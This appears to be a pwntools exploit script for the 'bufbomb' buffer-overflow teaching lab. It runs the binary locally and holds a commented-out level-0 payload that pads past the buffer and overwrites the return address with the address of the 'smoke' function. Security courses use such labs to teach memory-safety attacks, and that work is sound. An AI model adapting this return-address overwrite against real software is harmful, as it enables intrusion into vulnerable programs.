from pwn import *
context.log_level = 'debug'
context.arch ='i386'

r = process(["./bufbomb","-u","innerway"])

smoke = 0x08048c18

r.recv()

# #level 0
# payload = 'a'*0x28 + 'a'*0x4 
# payload += p32(smoke)
# r.sendline(payload)

r.interactive()
